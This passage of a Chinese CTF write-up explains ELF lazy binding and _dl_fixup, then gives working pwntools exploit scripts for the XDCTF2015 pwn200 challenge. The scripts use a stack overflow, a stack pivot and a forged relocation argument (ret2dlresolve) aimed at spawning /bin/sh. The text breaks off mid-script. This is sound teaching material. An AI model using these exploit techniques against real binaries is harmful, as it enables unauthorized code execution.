class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<p>关注动态符号中的两个成员</p>
<ul>
<li>st_name 该成员保存着动态符号在.dynstr表（动态字符串表）中的偏移</li>
<li>st_value 若该符号被导出，则这个符号保存着相应的虚拟地址</li>
</ul>
<p>下图可以看到.dynsym节区，根据上面提到read函数对应的r_info为0x107，0x107&gt;&gt;9=1，即为sym的index，于是找到sym[1]，与结果吻合<br>且ELF32_R_TYPE(0x507)=7，对应R_386_JUMP_SLOT<br>【R_386_JMP_SLOT    7    word32    S    该重定位类型由链接器为动态链接过程创建。它的偏移项给出了相应过程链接表项的位置。动态链接器修改过程链接表，从而把程序控制权转移到上述指出的符号地址。】</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ayoung</span>@ubuntu:~/Desktop/temp/re<span class="number">2</span>dlresolve$ readelf -s test</span><br><span class="line"></span><br><span class="line"><span class="attribute">Symbol</span> table &#x27;.dynsym&#x27; contains <span class="number">6</span> entries:</span><br><span class="line">   <span class="attribute">Num</span>:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="attribute">0</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="attribute">1</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND read@GLIBC_<span class="number">2</span>.<span class="number">0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="attribute">2</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_<span class="number">2</span>.<span class="number">4</span> (<span class="number">3</span>)</span><br><span class="line">     <span class="attribute">3</span>: <span class="number">00000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     <span class="attribute">4</span>: <span class="number">00000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_<span class="number">2</span>.<span class="number">0</span> (<span class="number">2</span>)</span><br><span class="line">     <span class="attribute">5</span>: <span class="number">0804853</span>c     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">16</span> _IO_stdin_used</span><br></pre></td></tr></table></figure>

<p>.dynstr（STRTAB，string table）节包含了动态链接的字符串，该节区以\x00作为开始和结束，中间每个字符串也以\x00间隔。</p>
<ul>
<li><p>首先查看.dynstm处相应结构体存储的内容（由前文给出结构体内容可以计算出一个结构体大小为4+4+4+1+1+2=16=0x10字节）。如下所示，对应数组下标标在图片右侧。Elf32_Sym[1]-&gt;st_name=0x2b</p>
<img src="https://ae01.alicdn.com/kf/U4c9f7ddd0ce94aac8394309bd1662a37H.jpg"/>
</li>
<li><p>接着查看.dynstr处存储的对应字符串，如下，由于Elf32_Sym[1]-&gt;st_name=0x2b，所以.dynstr加上0x2b的偏移量，就是字符串”read”</p>
<img src="https://ae01.alicdn.com/kf/U02e7efe6878f47c1b237ec62e1d623e2X.jpg"/>

</li>
</ul>
<h2 id="总结对read函数的解析过程"><a href="#总结对read函数的解析过程" class="headerlink" title="总结对read函数的解析过程"></a>总结对read函数的解析过程</h2><ul>
<li>先通过dynamic段获取各个表的地址，包括<ul>
<li>字符串表<code>.dynstr</code>的地址为<code>0x0804822c</code></li>
<li>符号表<code>.dynsym</code>的地址为<code>0x080481cc</code>，其单个符号表项大小（一个结构体）为16字节</li>
<li>重定位表<code>.rel.plt</code>的地址为<code>0x080482d8</code>，其单个重定位表项的大小（一个结构体）为8字节</li>
</ul>
</li>
<li>read函数为<code>.rel.plt</code>表中第一个元素，定位它的重定位表项，从结构体中得到raed函数的<code>r_offset</code>为<code>0x0804a00c</code>；以及它在符号表（Elf32_Sym数组）的下标为0x1，它的类型为0x7，对应R_386_JUMP_SLOT（r_info计算得到）</li>
<li>由0x1知道了read函数的符号表时<code>.dynsym</code>第二个元素，获取到该结构体，得到其对应的<code>st_name</code>的值为<code>0x2b</code>，从而获取了read字符串应该在<code>.dynstr</code>表偏移为0x2b的地方</li>
<li>最后调用函数解析匹配read字符串所对应的函数地址，将其填写到<code>r_offset</code>为<code>0x0804a00c</code>，即read函数的GOT表中</li>
</ul>
<h2 id="延迟绑定过程详解"><a href="#延迟绑定过程详解" class="headerlink" title="延迟绑定过程详解"></a>延迟绑定过程详解</h2><ul>
<li>第一次执行read函数时，跳转到read的plt表位置，接着跳转到read的got表（0x804a00c）存储的地址，从下图可以看到，此时got表中没有存放read的真实地址，而是下一条指令的地址，把reloc_arg=0x0作为参数入栈，接着跳转到0x8048320（plt表的第一项）</li>
</ul>
<img src="https://ae01.alicdn.com/kf/U42817243d0fb43c88802664950f53fda8.jpg"/>

<img src="https://ae01.alicdn.com/kf/Ua128c12b4cbc4ea2846403ee91ea2b4cn.jpg"/>

<img src="https://ae01.alicdn.com/kf/U1f7869b28595459780d88c4077d35f60d.jpg"/>

<ul>
<li>0x8048320再把link_map = *(GOT+4)作为参数压入栈中（GOT表第二项），而*（GOT+8）（GOT表第三项）保存的是_dl_runtime_resolve函数的地址。如下图，所以以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>【分别对应先后压入栈中的两个参数】<br>该函数会完成符号的解析，即将read函数的真实地址写入read的GOT表中，随后将控制权交给read函数<br>其中GOT+4和GOT+8的地址是程序加载时就确定了的，而对每个函数而言唯一不一样的就是reloc_arg，即函数对应的plt表第二行push的参数</li>
</ul>
<img src="https://ae01.alicdn.com/kf/U2325d2d04f9841619ae0dd1e286b931at.jpg"/>

<img src = 'https://ftp.bmp.ovh/imgs/2021/03/1cd39040ca311086.png' />

<ul>
<li>查看_dl_runtime_resolve，它在0xf7fee00b处调用_dl_fixup，并通过寄存器传参</li>
</ul>
<img src="https://ae01.alicdn.com/kf/U5e15da2cd67f4636be0c042d6bcb87f07.jpg"/>

<ul>
<li>_dl_fixup是在glibc-2.23/elf/dl-runtime.c实现的<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab</span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="comment">//获取符号表地址</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line">  <span class="comment">//获取字符串表地址</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="comment">//获取函数对应的重定位表结构地址</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="comment">//获取函数对应的符号表结构地址</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="comment">//得到函数对应的got地址，即真实函数地址要填回的地址</span></span><br><span class="line">  </span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  <span class="comment">//判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT</span></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">   <span class="comment">//需要绕过</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">      version = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">      <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">           sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">            + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">      <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">   address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">  <span class="comment">// 最后把value写入相应的GOT表条目rel_addr中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>重点如下：<br><code>_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</code></p>
<ul>
<li>首先通过参数<strong>reloc_arg</strong>计算重定位入口，这里的<strong>JMPREL</strong> 就是 <strong>.rel.plt</strong>，<strong>reloc_offset</strong> 就是 <strong>reloc_arg</strong><br><code>const PLTREL *const reloc = (const void *)(D_PTR(l,l_info[DT_JMPREL]) + reloc_offset);</code></li>
<li>然后通过<strong>reloc_r_info</strong> 找到 <strong>.dynsym</strong> 中的条目<br><code>const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM)(reloc-&gt;r_info)];</code></li>
<li>这里还会检查<strong>reloc_r_info</strong>的最低位是不是<strong>R_386_JUMP_SLOT=7</strong><br><code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code></li>
<li>接着通过<strong>strtab+sym-&gt;st_name</strong>找到符号表字符串,<strong>result</strong>为libc基地址<br><code>result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags，NULL);</code></li>
<li><strong>value</strong>为libc基址加上要解析函数的偏移地址，即函数的真实地址<br><code>value = EL_FIXUP_MAKE_VALUE（result, sym ？(LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_name) :0）;</code></li>
<li>最后把<strong>value</strong>写入相应的GOT表条目中<br><code>return elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</code></li>
</ul>
<h2 id="总结-dl-fixup函数功能"><a href="#总结-dl-fixup函数功能" class="headerlink" title="总结_dl_fixup函数功能"></a>总结_dl_fixup函数功能</h2><ol>
<li>程序首先从第一个参数link_map获取字符串表<code>.dynstr</code>、符号表<code>.dynsym</code>一起重定位表<code>.rel.plt</code>的地址</li>
<li>通过第二个参数n即<code>.rel.plt</code>表中的偏移<code>reloc_arg</code> + <code>.rel.plt</code>的地址获取函数对应的重定位结构的位置（Elf32_Rel），从而获得函数对应的<code>r_offset</code>以及符号表（Elf32_Sym）中的下标<code>r_info&gt;&gt;8</code></li>
<li>根据符号表地址以及下标获取符号结构体（Elf32_Sym[r_info&gt;&gt;8]），从而获得函数符号表中的<code>st_name</code>，即函数名相对于字符串表<code>.dynstr</code>的偏移（.dynstr基址+st_name 指向 相应函数名的字符串）</li>
<li>最后得到函数名的字符串，然后到libc中匹配函数名，找到对应的函数并将地址填入<code>r_offset</code>即函数GOT表中，完成延迟绑定</li>
</ol>
<img src = 'https://i.bmp.ovh/imgs/2021/03/a9ed797e746664ef.png' />

<h1 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h1><ol>
<li>控制<code>eip</code>为PLT[0]的地址，这时我们需要代替正常流程自行填充一个<code>reloc_arg</code></li>
<li>控制<code>reloc_arg</code>的大小，使<code>Elf32_Rel</code>的位置落在可控地址内</li>
<li>伪造<code>Elf32_Rel</code>的结构体内容（r_offset和r_info），使<code>Elf32_Sym</code>落在可控地址内</li>
<li>伪造<code>Elf32_Sym</code>的结构体内容（st_name、st_value、st_size、st_info、st_other、st_shndx），使<code>name</code>落在可控地址内</li>
<li>伪造<code>name</code>为任意库函数，如<code>system</code></li>
</ol>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>adworld-pwn200<br>存在一个赤裸的栈溢出漏洞<br><img src = 'https://i.bmp.ovh/imgs/2021/03/35b8c69560b7a3ef.png' /></p>
<h2 id="手动构造"><a href="#手动构造" class="headerlink" title="手动构造"></a>手动构造</h2><h3 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h3><p>在这里使用栈迁移的方法，将栈迁移到bss段来控制write函数，主要有两步</p>
<ol>
<li>将栈迁移到bss段（可写）</li>
<li>控制write函数输出相应字符串<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p_p_p_ret = <span class="number">0x0804856c</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload1 += p32(read_plt)</span><br><span class="line">payload1 += p32(p_p_p_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(<span class="number">100</span>)	   <span class="comment">#read(0,base_stage,100)</span></span><br><span class="line">payload1 += p32(pop_ebp_ret)</span><br><span class="line">payload1 += p32(base_stage)<span class="comment">#fake ebp</span></span><br><span class="line">payload1 += p32(leave_ret) <span class="comment">#stack piovt</span></span><br><span class="line"><span class="comment">#（leave=&gt;mov esp,ebp;pop ebp;ret）</span></span><br><span class="line"></span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span> <span class="comment">#cmd相对于栈底地偏移</span></span><br><span class="line">cmd = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span>		   <span class="comment">#对应栈迁移中leave指令的pop ebp</span></span><br><span class="line">payload2 += p32(write_plt) <span class="comment">#ret到这条指令</span></span><br><span class="line">payload2 += <span class="string">&#x27;dead&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd)) <span class="comment">#write(1,binsh_addr,len)</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">80</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 = payload2.ljust(<span class="number">100</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!&#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
最后成功打印出cmd<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching <span class="keyword">to</span> interactive <span class="keyword">mode</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received <span class="number">0</span>x8 byte<span class="variable">s:</span></span><br><span class="line">    <span class="number">00000000</span>  <span class="number">2</span><span class="keyword">f</span> <span class="number">62</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">e</span>  <span class="number">2</span><span class="keyword">f</span> <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>                            │/bin│/<span class="keyword">sh</span>·│</span><br><span class="line">    <span class="number">00000008</span></span><br><span class="line">/bin/<span class="keyword">sh</span>\x00[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h3>这次直接控制EIP返回到PLT[0]并手动在栈上填充一个<strong>reloc_arg/index_offset</strong><br>从而代替了程序原来的流程中push的相应的参数</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p_p_p_ret = <span class="number">0x0804856c</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload1 += p32(read_plt)</span><br><span class="line">payload1 += p32(p_p_p_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(<span class="number">100</span>)</span><br><span class="line">payload1 += p32(pop_ebp_ret)</span><br><span class="line">payload1 += p32(base_stage)</span><br><span class="line">payload1 += p32(leave_ret) <span class="comment">#stack piovt</span></span><br><span class="line"></span><br><span class="line">binsh_addr = base_stage + <span class="number">80</span></span><br><span class="line">cmd = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">plt_start = <span class="number">0x08048370</span> <span class="comment">#objdump -d -j .plt pwn200 -M intel</span></span><br><span class="line">rel_offset = <span class="number">0x20</span> <span class="comment">#index_offset/reloc_arg</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_start)</span><br><span class="line">payload2 += p32(rel_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;dead&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(binsh_addr)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 = payload2.ljust(<span class="number">80</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">payload2 += cmd</span><br><span class="line">payload2 = payload2.ljust(<span class="number">100</span>,<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>成功</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching <span class="keyword">to</span> interactive <span class="keyword">mode</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received <span class="number">0</span>x8 byte<span class="variable">s:</span></span><br><span class="line">    <span class="number">00000000</span>  <span class="number">2</span><span class="keyword">f</span> <span class="number">62</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">e</span>  <span class="number">2</span><span class="keyword">f</span> <span class="number">73</span> <span class="number">68</span> <span class="number">00</span>                            │/bin│/<span class="keyword">sh</span>·│</span><br><span class="line">    <span class="number">00000008</span></span><br><span class="line">/bin/<span class="keyword">sh</span>\x00[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h3><p>这次控制<strong>reloc_arg/index_offset/reloc_offset</strong>，使其指向我们构造的<strong>fake_reloc</strong>（即存有r_offset和r_info的结构体Elf32_Rel）（.rel.plt表的基址，即<strong>JMPREL</strong>，加上<strong>reloc_arg</strong>偏移即找到相应的结构体）<br><strong>fake_reloc</strong>的内容为r_offset=0x804a010，<strong>r_info</strong>=0x507（<code>readelf -r pwn200</code>）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p_p_p_ret = <span class="number">0x0804856c</span></span><br><span class="line">leave_ret = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">112</span></span><br><span class="line">payload1 += p32(read_plt)</span><br><span class="line">payload1 += p32(p_p_p_ret)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span 